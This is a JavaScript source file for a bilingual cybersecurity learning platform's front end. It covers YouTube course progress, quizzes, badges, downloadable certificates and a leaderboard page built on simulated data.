window.saveYouTubeNotes = function (playlistId) {
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  if (!ytProgress[playlistId]) {
    ytProgress[playlistId] = { currentVideo: 0, watchedVideos: [], rating: 0, isFavorite: false, notes: '', watchTime: 0 };
  }
  var notesEl = document.getElementById('course-notes');
  if (notesEl) {
    ytProgress[playlistId].notes = notesEl.value;
    localStorage.setItem('youtube_progress', JSON.stringify(ytProgress));
  }
};

// Keyboard Shortcuts - REMOVED BY USER REQUEST



// Watch Time Tracking
window.startWatchTimeTracking = function (playlistId) {
  if (window.watchTimeInterval) clearInterval(window.watchTimeInterval);

  window.watchTimeInterval = setInterval(function () {
    var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
    if (!ytProgress[playlistId]) {
      ytProgress[playlistId] = { currentVideo: 0, watchedVideos: [], rating: 0, isFavorite: false, notes: '', watchTime: 0 };
    }
    ytProgress[playlistId].watchTime = (ytProgress[playlistId].watchTime || 0) + 10;
    localStorage.setItem('youtube_progress', JSON.stringify(ytProgress));
  }, 10000); // Update every 10 seconds
};

// Generate Certificate
window.generateCertificate = function (playlistId) {
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var playlist = ytData.playlists.find(function (p) { return p.id === playlistId; });
  if (!playlist) return;

  var courseName = currentLang === 'ar' ? playlist.titleAr : playlist.title;
  var date = new Date().toLocaleDateString(currentLang === 'ar' ? 'ar-EG' : 'en-US', { year: 'numeric', month: 'long', day: 'numeric' });

  var certHtml = '<!DOCTYPE html><html><head><style>' +
    'body { font-family: Georgia, serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #f5f5f5; margin: 0; }' +
    '.cert { width: 800px; background: linear-gradient(135deg, #1a1a2e, #16213e); color: white; padding: 60px; text-align: center; border: 10px solid #ffd700; box-shadow: 0 20px 60px rgba(0,0,0,0.3); }' +
    '.cert h1 { font-size: 3rem; margin-bottom: 20px; color: #ffd700; }' +
    '.cert h2 { font-size: 1.5rem; margin-bottom: 40px; opacity: 0.8; }' +
    '.cert .name { font-size: 2rem; margin: 30px 0; border-bottom: 2px solid #ffd700; display: inline-block; padding-bottom: 10px; }' +
    '.cert .course { font-size: 1.3rem; margin: 20px 0; color: #667eea; }' +
    '.cert .date { margin-top: 40px; opacity: 0.7; }' +
    '.cert .badge { font-size: 4rem; margin-bottom: 20px; }' +
    '</style></head><body>' +
    '<div class="cert">' +
    '<div class="badge">🏅</div>' +
    '<h1>' + txt('شهادة إتمام', 'Certificate of Completion') + '</h1>' +
    '<h2>' + txt('هذا يشهد بأن', 'This is to certify that') + '</h2>' +
    '<div class="name">' + txt('المتعلم', 'Learner') + '</div>' +
    '<p>' + txt('قد أكمل بنجاح كورس', 'has successfully completed the course') + '</p>' +
    '<div class="course">' + courseName + '</div>' +
    '<p class="date">' + date + '</p>' +
    '<p style="margin-top: 30px; opacity: 0.6;">BreachLabs - Cybersecurity Learning Platform</p>' +
    '</div>' +
    '</body></html>';

  var blob = new Blob([certHtml], { type: 'text/html' });
  var url = URL.createObjectURL(blob);
  var a = document.createElement('a');
  a.href = url;
  a.download = 'certificate-' + playlistId + '.html';
  a.click();
  URL.revokeObjectURL(url);

  if (typeof xpSystem !== 'undefined') {
    xpSystem.addXp(50);
  }
};

// Get Favorites List
window.getYouTubeFavorites = function () {
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  var favorites = [];
  for (var playlistId in ytProgress) {
    if (ytProgress[playlistId].isFavorite) {
      favorites.push(playlistId);
    }
  }
  return favorites;
};

// ========== Toast Notification System ==========
window.showYouTubeToast = function (message, type) {
  type = type || 'default';

  // Remove existing toast
  var existingToast = document.querySelector('.yt-toast');
  if (existingToast) existingToast.remove();

  // Create toast
  var toast = document.createElement('div');
  toast.className = 'yt-toast yt-toast-' + type;
  toast.innerHTML = message;

  // Add styles if not exists
  if (!document.getElementById('yt-toast-styles')) {
    var style = document.createElement('style');
    style.id = 'yt-toast-styles';
    style.textContent =
      '.yt-toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px); background: rgba(0,0,0,0.9); color: white; padding: 15px 25px; border-radius: 12px; font-size: 0.95rem; z-index: 10000; animation: toastSlideUp 0.3s ease forwards; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }' +
      '.yt-toast-success { background: linear-gradient(135deg, #28a745, #20c997); }' +
      '.yt-toast-info { background: linear-gradient(135deg, #667eea, #764ba2); }' +
      '.yt-toast-warning { background: linear-gradient(135deg, #ffc107, #fd7e14); color: #000; }' +
      '@keyframes toastSlideUp { from { transform: translateX(-50%) translateY(100px); opacity: 0; } to { transform: translateX(-50%) translateY(0); opacity: 1; } }' +
      '@keyframes toastSlideDown { from { transform: translateX(-50%) translateY(0); opacity: 1; } to { transform: translateX(-50%) translateY(100px); opacity: 0; } }';
    document.head.appendChild(style);
  }

  document.body.appendChild(toast);

  // Auto remove after 3 seconds
  setTimeout(function () {
    toast.style.animation = 'toastSlideDown 0.3s ease forwards';
    setTimeout(function () { toast.remove(); }, 300);
  }, 3000);
};

// ========== Learning Stats ==========
window.getYouTubeLearningStats = function () {
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };

  var stats = {
    totalCourses: ytData.playlists.length,
    startedCourses: 0,
    completedCourses: 0,
    totalVideos: 0,
    watchedVideos: 0,
    totalWatchTime: 0,
    favoriteCount: 0
  };

  ytData.playlists.forEach(function (playlist) {
    stats.totalVideos += playlist.totalVideos;
    var progress = ytProgress[playlist.id];
    if (progress) {
      var watchedCount = (progress.watchedVideos || []).length;
      if (watchedCount > 0) stats.startedCourses++;
      if (watchedCount >= playlist.totalVideos) stats.completedCourses++;
      stats.watchedVideos += watchedCount;
      stats.totalWatchTime += progress.watchTime || 0;
      if (progress.isFavorite) stats.favoriteCount++;
    }
  });

  stats.overallProgress = stats.totalVideos > 0 ? Math.round((stats.watchedVideos / stats.totalVideos) * 100) : 0;
  stats.watchTimeHours = Math.round(stats.totalWatchTime / 3600);

  return stats;
};

// ========== Related Courses ==========
window.getRelatedCourses = function (playlistId, limit) {
  limit = limit || 3;
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var currentPlaylist = ytData.playlists.find(function (p) { return p.id === playlistId; });

  if (!currentPlaylist) return [];

  // Find courses in same category
  var related = ytData.playlists.filter(function (p) {
    return p.id !== playlistId && p.category === currentPlaylist.category;
  });

  // If not enough, add from other categories with same level
  if (related.length < limit) {
    var sameLevelCourses = ytData.playlists.filter(function (p) {
      return p.id !== playlistId && p.level === currentPlaylist.level && p.category !== currentPlaylist.category;
    });
    related = related.concat(sameLevelCourses);
  }

  return related.slice(0, limit);
};

// ========== Badges/Achievements ==========
window.getYouTubeBadges = function () {
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var badges = [];

  var stats = getYouTubeLearningStats();

  // First video badge
  if (stats.watchedVideos >= 1) {
    badges.push({ id: 'first-video', icon: '🎬', name: txt('المشاهد الأول', 'First Viewer'), desc: txt('شاهدت أول فيديو', 'Watched first video') });
  }

  // 10 videos badge
  if (stats.watchedVideos >= 10) {
    badges.push({ id: 'ten-videos', icon: '🔟', name: txt('متعلم نشط', 'Active Learner'), desc: txt('شاهدت 10 فيديوهات', 'Watched 10 videos') });
  }

  // First course complete
  if (stats.completedCourses >= 1) {
    badges.push({ id: 'first-course', icon: '🏆', name: txt('منجز الكورسات', 'Course Completer'), desc: txt('أكملت كورس كامل', 'Completed a full course') });
  }

  // 5 courses started
  if (stats.startedCourses >= 5) {
    badges.push({ id: 'explorer', icon: '🧭', name: txt('المستكشف', 'Explorer'), desc: txt('بدأت 5 كورسات', 'Started 5 courses') });
  }

  // Favorite collector
  if (stats.favoriteCount >= 3) {
    badges.push({ id: 'collector', icon: '❤️', name: txt('جامع المفضلة', 'Favorites Collector'), desc: txt('أضفت 3 كورسات للمفضلة', 'Added 3 courses to favorites') });
  }

  return badges;
};

// ========== Tab Switching ==========
window.switchYouTubeTab = function (tabName) {
  // Update tab buttons
  document.querySelectorAll('.yt-tab').forEach(function (tab) {
    tab.classList.remove('active');
  });
  event.target.closest('.yt-tab').classList.add('active');

  // Update tab contents
  document.querySelectorAll('.yt-tab-content').forEach(function (content) {
    content.classList.remove('active');
  });
  var targetTab = document.getElementById('tab-' + tabName);
  if (targetTab) {
    targetTab.classList.add('active');
  }

  // Load content on first view
  if (tabName === 'badges') {
    renderYouTubeBadges();
  } else if (tabName === 'related') {
    renderRelatedCourses();
  }
};

// ========== Render Badges ==========
window.renderYouTubeBadges = function () {
  var container = document.getElementById('badges-container');
  if (!container) return;

  var badges = getYouTubeBadges();

  if (badges.length === 0) {
    container.innerHTML = '<div style="text-align: center; opacity: 0.6; padding: 30px;">' +
      '<i class="fa-solid fa-trophy" style="font-size: 3rem; margin-bottom: 15px; display: block;"></i>' +
      '<p>' + txt('لم تحصل على أي شارات بعد. استمر في التعلم!', 'No badges yet. Keep learning!') + '</p>' +
      '</div>';
    return;
  }

  var html = '';
  badges.forEach(function (badge) {
    html += '<div class="yt-badge-item">' +
      '<span class="yt-badge-icon">' + badge.icon + '</span>' +
      '<div>' +
      '<div class="yt-badge-name">' + badge.name + '</div>' +
      '<div class="yt-badge-desc">' + badge.desc + '</div>' +
      '</div>' +
      '</div>';
  });

  container.innerHTML = html;
};

// ========== Render Related Courses ==========
window.renderRelatedCourses = function () {
  var container = document.getElementById('related-courses-container');
  if (!container) return;

  var viewerEl = document.getElementById('yt-viewer');
  if (!viewerEl) return;

  var playlistId = viewerEl.dataset.playlist;
  var relatedCourses = getRelatedCourses(playlistId, 4);

  if (relatedCourses.length === 0) {
    container.innerHTML = '<div style="text-align: center; opacity: 0.6; padding: 30px;">' +
      '<p>' + txt('لا توجد كورسات مشابهة حالياً', 'No related courses available') + '</p>' +
      '</div>';
    return;
  }

  var html = '';
  relatedCourses.forEach(function (course) {
    var thumbUrl = 'https://img.youtube.com/vi/' + course.thumbnail + '/hqdefault.jpg';
    html += '<div class="yt-related-card" onclick="openYouTubePlaylist(\'' + course.id + '\')">' +
      '<div class="yt-related-thumb" style="background-image: url(\'' + thumbUrl + '\')"></div>' +
      '<div class="yt-related-info">' +
      '<h5>' + (currentLang === 'ar' ? course.titleAr : course.title) + '</h5>' +
      '<small><i class="fa-solid fa-play me-1"></i>' + course.totalVideos + ' ' + txt('فيديو', 'videos') + '</small>' +
      '</div>' +
      '</div>';
  });

  container.innerHTML = html;
};

// ========== Initialize YouTube Viewer Tabs ==========
window.initYouTubeViewer = function () {
  // Load badges and related on page load
  setTimeout(function () {
    renderYouTubeBadges();
    renderRelatedCourses();
  }, 500);
};

// ==================== QUIZ FUNCTIONS ====================

// Render Quiz
window.renderYouTubeQuiz = function (playlistId) {
  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var playlist = ytData.playlists.find(function (p) { return p.id === playlistId; });
  var ytProgress = JSON.parse(localStorage.getItem('youtube_progress') || '{}');
  var progress = ytProgress[playlistId] || { currentVideo: 0 };
  var currentVideo = playlist.videos[progress.currentVideo || 0];

  var quizContainer = document.getElementById('yt-quiz-container');
  if (!quizContainer || !playlist.quizzes) return;

  // Find quiz for current video
  var quiz = playlist.quizzes.find(function (q) { return q.videoId === currentVideo.videoId; });

  if (!quiz) {
    quizContainer.innerHTML = '<div class="text-center p-5" style="opacity: 0.7;">' +
      '<i class="fa-solid fa-clipboard-check fa-3x mb-3"></i>' +
      '<p>' + txt('لا يوجد اختبار لهذا الدرس حالياً.', 'No quiz available for this lesson yet.') + '</p>' +
      '</div>';
    return;
  }

  // Check if check already exists to avoid re-rendering
  if (quizContainer.querySelector('.yt-quiz-card') && quizContainer.dataset.quizId === quiz.id) return;

  var optionsHtml = quiz.options.map(function (opt, idx) {
    return '<div class="yt-quiz-option" onclick="checkQuizAnswer(\'' + quiz.id + '\', ' + idx + ', this)">' +
      '<div class="d-flex align-items-center justify-content-between">' +
      '<span>' + opt + '</span>' +
      '<i class="fa-regular fa-circle status-icon"></i>' +
      '</div>' +
      '</div>';
  }).join('');

  quizContainer.dataset.quizId = quiz.id;
  quizContainer.innerHTML = '<div class="yt-quiz-card">' +
    '<div class="yt-quiz-question">' + quiz.question + '</div>' +
    '<div class="yt-quiz-options">' + optionsHtml + '</div>' +
    '<div class="yt-quiz-feedback" id="quiz-feedback-' + quiz.id + '"></div>' +
    '</div>';
};

// Check Quiz Answer
window.checkQuizAnswer = function (quizId, selectedIdx, el) {
  if (el.parentElement.classList.contains('answered')) return;

  var ytData = typeof youtubeCoursesData !== 'undefined' ? youtubeCoursesData : { categories: [], playlists: [] };
  var quiz = null;

  // Find quiz in any playlist
  for (var i = 0; i < ytData.playlists.length; i++) {
    if (ytData.playlists[i].quizzes) {
      quiz = ytData.playlists[i].quizzes.find(function (q) { return q.id === quizId; });
      if (quiz) break;
    }
  }

  if (!quiz) return;

  var options = el.parentElement.querySelectorAll('.yt-quiz-option');
  options.forEach(function (o) { o.classList.remove('selected'); });
  el.classList.add('selected');
  el.parentElement.classList.add('answered');

  var feedbackEl = document.getElementById('quiz-feedback-' + quizId);
  var isCorrect = selectedIdx === quiz.correctAnswer;

  if (isCorrect) {
    el.classList.add('correct');
    el.querySelector('.status-icon').className = 'fa-solid fa-circle-check status-icon';
    feedbackEl.className = 'yt-quiz-feedback success';
    feedbackEl.innerHTML = '<i class="fa-solid fa-check-circle me-2"></i>' + txt('إجابة صحيحة! ', 'Correct! ') + quiz.explanation;
    if (typeof showYouTubeToast === 'function') showYouTubeToast(txt('ممتاز! إجابة صحيحة', 'Excellent! Correct answer'), 'success');
  } else {
    el.classList.add('wrong');
    el.querySelector('.status-icon').className = 'fa-solid fa-circle-xmark status-icon';
    var correctEl = options[quiz.correctAnswer];
    correctEl.classList.add('correct');
    correctEl.querySelector('.status-icon').className = 'fa-solid fa-circle-check status-icon';
    feedbackEl.className = 'yt-quiz-feedback error';
    feedbackEl.innerHTML = '<i class="fa-solid fa-times-circle me-2"></i>' + txt('إجابة خاطئة. ', 'Incorrect. ') + quiz.explanation;
  }
  feedbackEl.style.display = 'block';
};

// Hook into Tab Switching
var _originalSwitchTab = window.switchYouTubeTab;
window.switchYouTubeTab = function (tabName) {
  if (_originalSwitchTab) _originalSwitchTab(tabName);

  if (tabName === 'quiz') {
    var viewerEl = document.getElementById('yt-viewer');
    if (viewerEl) {
      renderYouTubeQuiz(viewerEl.dataset.playlist);
    }
  }
};

// [Deleted Lab Paths Section]
// ==================== ADVANCED LEADERBOARD PAGE ====================
function pageLeaderboard() {
  const totalPoints = typeof getTotalUserPoints === 'function' ? getTotalUserPoints() : 0;
  const userAchievements = typeof getUserAchievements === 'function' ? getUserAchievements() : [];

  // Simulated leaderboard data (in a real app, this would come from a backend)
  const leaderboardData = [
    { rank: 1, username: 'CyberNinja', points: 15420, labs: 45, badges: 12, country: '🇸🇦', avatar: 'N' },
    { rank: 2, username: 'HackerX', points: 13850, labs: 42, badges: 10, country: '🇪🇬', avatar: 'H' },
    { rank: 3, username: 'SecMaster', points: 12200, labs: 38, badges: 9, country: '🇯🇴', avatar: 'S' },
    { rank: 4, username: 'RedTeamer', points: 10500, labs: 35, badges: 8, country: '🇦🇪', avatar: 'R' },
    { rank: 5, username: 'BugHunter', points: 9800, labs: 32, badges: 7, country: '🇰🇼', avatar: 'B' },
    { rank: 6, username: 'PenTestPro', points: 8750, labs: 30, badges: 7, country: '🇶🇦', avatar: 'P' },
    { rank: 7, username: 'NetBreaker', points: 7600, labs: 28, badges: 6, country: '🇧🇭', avatar: 'N' },
    { rank: 8, username: 'SQLKing', points: 6900, labs: 25, badges: 5, country: '🇴🇲', avatar: 'S' },
    { rank: 9, username: 'XSSMaster', points: 6200, labs: 23, badges: 5, country: '🇱🇧', avatar: 'X' },
    { rank: 10, username: 'CryptoBreaker', points: 5500, labs: 20, badges: 4, country: '🇲🇦', avatar: 'C' }
  ];

  // Calculate user's rank
  const userRank = leaderboardData.filter(u => u.points > totalPoints).length + 1;

  return `
    <div class="leaderboard-page">
      <style>
        .leaderboard-page {
          background: linear-gradient(180deg, #0a0a1a 0%, #16213e 100%);
          min-height: 100vh;
          padding-bottom: 50px;
        }

        /* Hero Section */
        .lb-hero {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
          padding: 50px 30px;
          text-align: center;
          position: relative;
          overflow: hidden;
        }
        .lb-hero::before {
          content: '';
          position: absolute;
          top: 0; left: 0; right: 0; bottom: 0;
          background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.05'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
        }
        .lb-hero-content {
          position: relative;
          z-index: 1;
        }
        .lb-hero h1 {
          font-size: 2.5rem;
          font-weight: 800;
          color: white;
          margin: 0 0 10px;
        }
        .lb-hero h1 i {
          color: #f5a623;
          margin-right: 15px;
        }
        .lb-hero p {
          color: rgba(255,255,255,0.9);
          font-size: 1.1rem;
        }

        /* User Stats */
        .user-stats-bar {
          display: flex;
          justify-content: center;
          gap: 30px;
          margin-top: 30px;
        }
        .user-stat-card {
          background: rgba(255,255,255,0.15);
          backdrop-filter: blur(10px);
          padding: 20px 35px;
          border-radius: 15px;
          text-align: center;
        }
        .user-stat-value {
          font-size: 2rem;
          font-weight: 700;
          color: #38ef7d;
        }
        .user-stat-label {
          color: rgba(255,255,255,0.8);
          font-size: 0.9rem;
        }

        /* Content Container */
        .lb-container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 40px;
        }

        /* Filter Tabs */
        .lb-filters {
          display: flex;
          justify-content: center;
          gap: 10px;
          margin-bottom: 40px;
        }
        .lb-filter-btn {
          padding: 12px 30px;
          background: rgba(255,255,255,0.05);
          border: 1px solid rgba(255,255,255,0.1);
          border-radius: 25px;
          color: #a0aec0;
          cursor: pointer;
          transition: all 0.3s;
          font-weight: 500;
        }
        .lb-filter-btn.active {
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          color: white;
          border-color: transparent;
        }
        .lb-filter-btn:hover:not(.active) {
          background: rgba(255,255,255,0.1);
          color: white;
        }

        /* Top 3 Podium */
        .podium-section {
          display: flex;
          justify-content: center;
          align-items: flex-end;
          gap: 20px;
          margin-bottom: 50px;
        }
        .podium-card {
          text-align: center;
          padding: 25px;
          border-radius: 20px;
          transition: all 0.3s;
        }
        .podium-card:hover {
          transform: translateY(-10px);
        }
        .podium-2 {
          background: linear-gradient(145deg, rgba(192, 192, 192, 0.2) 0%, rgba(192, 192, 192, 0.05) 100%);
          border: 2px solid rgba(192, 192, 192, 0.3);
          order: 1;
        }
        .podium-1 {
          background: linear-gradient(145deg, rgba(255, 215, 0, 0.2) 0%, rgba(255, 215, 0, 0.05) 100%);
          border: 2px solid rgba(255, 215, 0, 0.4);
          order: 2;
          padding: 30px 35px;
        }
        .podium-3 {
          background: linear-gradient(145deg, rgba(205, 127, 50, 0.2) 0%, rgba(205, 127, 50, 0.05) 100%);
          border: 2px solid rgba(205, 127, 50, 0.3);
          order: 3;
        }
        .podium-avatar {
          width: 70px;
          height: 70px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-size: 1.8rem;
          font-weight: 700;
          color: white;
          margin: 0 auto 15px;
        }
        .podium-1 .podium-avatar {
          width: 90px;
          height: 90px;
          font-size: 2.2rem;
          background: linear-gradient(135deg, #ffd700 0%, #ff8c00 100%);
        }
        .podium-2 .podium-avatar {
          background: linear-gradient(135deg, #c0c0c0 0%, #a0a0a0 100%);
        }
        .podium-3 .podium-avatar {
          background: linear-gradient(135deg, #cd7f32 0%, #a06020 100%);
        }
        .podium-rank {
          font-size: 1.5rem;
          font-weight: 700;
          margin-bottom: 5px;
        }
        .podium-1 .podium-rank { color: #ffd700; }
        .podium-2 .podium-rank { color: #c0c0c0; }
        .podium-3 .podium-rank { color: #cd7f32; }
        .podium-name {
          color: white;
          font-size: 1.2rem;
          font-weight: 600;
          margin-bottom: 5px;
        }
        .podium-points {
          color: #38ef7d;
          font-weight: 700;
          font-size: 1.4rem;
        }
        .podium-badges {
          color: #718096;
          font-size: 0.9rem;
          margin-top: 8px;
        }

        /* Rankings Table */
        .rankings-section h2 {
          color: white;
          font-size: 1.5rem;
          margin-bottom: 25px;
          display: flex;
          align-items: center;
          gap: 10px;
        }
        .rankings-section h2 i {
          color: #667eea;
        }
        .rankings-table {
          width: 100%;
          background: rgba(255,255,255,0.03);
          border-radius: 15px;
          overflow: hidden;
        }
        .rt-header {
          display: grid;
          grid-template-columns: 80px 1fr 120px 100px 100px;
          padding: 15px 25px;
          background: rgba(255,255,255,0.05);
          color: #718096;
          font-weight: 600;
          font-size: 0.9rem;
        }
        .rt-row {
          display: grid;
          grid-template-columns: 80px 1fr 120px 100px 100px;
          padding: 18px 25px;
          border-bottom: 1px solid rgba(255,255,255,0.05);
          align-items: center;
          transition: all 0.3s;
        }
        .rt-row:hover {
          background: rgba(102, 126, 234, 0.1);
        }
        .rt-row.is-user {
          background: rgba(56, 239, 125, 0.1);
          border: 1px solid rgba(56, 239, 125, 0.3);
        }
        .rt-rank {
          font-weight: 700;
          font-size: 1.1rem;
        }
        .rt-rank.gold { color: #ffd700; }
        .rt-rank.silver { color: #c0c0c0; }
        .rt-rank.bronze { color: #cd7f32; }
        .rt-rank.normal { color: #a0aec0; }
        .rt-user {
          display: flex;
          align-items: center;
          gap: 15px;
        }
        .rt-avatar {
          width: 45px;
          height: 45px;
          border-radius: 50%;
          background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
          display: flex;
          align-items: center;
          justify-content: center;
          color: white;
          font-weight: 600;
        }
        .rt-name {
          color: white;
          font-weight: 600;
        }
        .rt-country {
          font-size: 1.5rem;
          margin-left: 10px;
        }
        .rt-points {
          color: #38ef7d;
          font-weight: 700;
          font-size: 1.1rem;
        }
        .rt-labs {
          color: #a0aec0;
        }
        .rt-badges {
          display: flex;
          align-items: center;
          gap: 5px;
          color: #f5a623;
        }

        @media (max-width: 768px) {
          .user-stats-bar { flex-wrap: wrap; }
          .podium-section { flex-wrap: wrap; }
          .rt-header, .rt-row { grid-template-columns: 60px 1fr 80px; }
          .rt-labs, .rt-badges { display: none; }
        }
      </style>

      <!-- Hero Section -->
      <div class="lb-hero">
        <div class="lb-hero-content">
          <h1><i class="fas fa-trophy"></i> ${txt('لوحة المتصدرين', 'Leaderboard')}</h1>
          <p>${txt('انضم للمنافسة واثبت مهاراتك!', 'Join the competition and prove your skills!')}</p>

          <div class="user-stats-bar">
            <div class="user-stat-card">
              <div class="user-stat-value">#${userRank}</div>
              <div class="user-stat-label">${txt('ترتيبك', 'Your Rank')}</div>
            </div>
            <div class="user-stat-card">
              <div class="user-stat-value">${totalPoints}</div>
              <div class="user-stat-label">${txt('نقاطك', 'Your Points')}</div>
            </div>
            <div class="user-stat-card">
              <div class="user-stat-value">${userAchievements.length}</div>
              <div class="user-stat-label">${txt('إنجازاتك', 'Your Badges')}</div>
            </div>
          </div>
        </div>
      </div>

      <div class="lb-container">
        <!-- Filter Tabs -->
        <div class="lb-filters">
          <button class="lb-filter-btn active" onclick="filterLeaderboard('weekly')">
            <i class="fas fa-calendar-week"></i> ${txt('هذا الأسبوع', 'This Week')}
          </button>
          <button class="lb-filter-btn" onclick="filterLeaderboard('monthly')">
            <i class="fas fa-calendar-alt"></i> ${txt('هذا الشهر', 'This Month')}
          </button>
          <button class="lb-filter-btn" onclick="filterLeaderboard('alltime')">
            <i class="fas fa-infinity"></i> ${txt('كل الأوقات', 'All Time')}
          </button>
        </div>

        <!-- Top 3 Podium -->
        <div class="podium-section">
          <div class="podium-card podium-2">
            <div class="podium-avatar">${leaderboardData[1].avatar}</div>
            <div class="podium-rank">🥈 #2</div>
            <div class="podium-name">${leaderboardData[1].username}</div>
            <div class="podium-points">${leaderboardData[1].points.toLocaleString()}</div>
            <div class="podium-badges"><i class="fas fa-medal"></i> ${leaderboardData[1].badges} badges</div>
          </div>
          <div class="podium-card podium-1">
            <div class="podium-avatar">${leaderboardData[0].avatar}</div>
            <div class="podium-rank">🥇 #1</div>
            <div class="podium-name">${leaderboardData[0].username}</div>
            <div class="podium-points">${leaderboardData[0].points.toLocaleString()}</div>
            <div class="podium-badges"><i class="fas fa-medal"></i> ${leaderboardData[0].badges} badges</div>
          </div>
          <div class="podium-card podium-3">
            <div class="podium-avatar">${leaderboardData[2].avatar}</div>
            <div class="podium-rank">🥉 #3</div>
            <div class="podium-name">${leaderboardData[2].username}</div>
            <div class="podium-points">${leaderboardData[2].points.toLocaleString()}</div>
            <div class="podium-badges"><i class="fas fa-medal"></i> ${leaderboardData[2].badges} badges</div>
          </div>
        </div>

        <!-- Full Rankings -->
        <div class="rankings-section">
          <h2><i class="fas fa-list-ol"></i> ${txt('الترتيب الكامل', 'Full Rankings')}</h2>

          <div class="rankings-table">
            <div class="rt-header">
              <div>${txt('الرتبة', 'Rank')}</div>
              <div>${txt('اللاعب', 'Player')}</div>
              <div>${txt('النقاط', 'Points')}</div>
              <div>${txt('المختبرات', 'Labs')}</div>
              <div>${txt('الشارات', 'Badges')}</div>
            </div>

            ${leaderboardData.map((user, i) => `
              <div class="rt-row">
                <div class="rt-rank ${i === 0 ? 'gold' : i === 1 ? 'silver' : i === 2 ? 'bronze' : 'normal'}">
                  ${i < 3 ? ['🥇', '🥈', '🥉'][i] : '#' + user.rank}
                </div>
                <div class="rt-user">
                  <div class="rt-avatar">${user.avatar}</div>
                  <span class="rt-name">${user.username}</span>
                  <span class="rt-country">${user.country}</span>
                </div>
                <div class="rt-points">${user.points.toLocaleString()}</div>
                <div class="rt-labs"><i class="fas fa-flask"></i> ${user.labs}</div>
                <div class="rt-badges"><i class="fas fa-medal"></i> ${user.badges}</div>
              </div>
            `).join('')}

            <!-- User's position if not in top 10 -->
            ${userRank > 10 ? `
              <div class="rt-row is-user">
                <div class="rt-rank normal">#${userRank}</div>
                <div class="rt-user">
                  <div class="rt-avatar" style="background: linear-gradient(135deg, #38ef7d 0%, #11998e 100%);">
                    <i class="fas fa-user"></i>
                  </div>
                  <span class="rt-name">${txt('أنت', 'You')}</span>
                  <span class="rt-country">🌟</span>
                </div>
                <div class="rt-points">${totalPoints.toLocaleString()}</div>
                <div class="rt-labs"><i class="fas fa-flask"></i> --</div>
                <div class="rt-badges"><i class="fas fa-medal"></i> ${userAchievements.length}</div>
              </div>
            ` : ''}
          </div>
        </div>
      </div>
    </div>
  `;
}

// Filter leaderboard
window.filterLeaderboard = function (filter) {
  document.querySelectorAll('.lb-filter-btn').forEach(btn => btn.classList.remove('active'));
  event.target.classList.add('active');
  // In a real app, this would fetch different data based on the filter
};

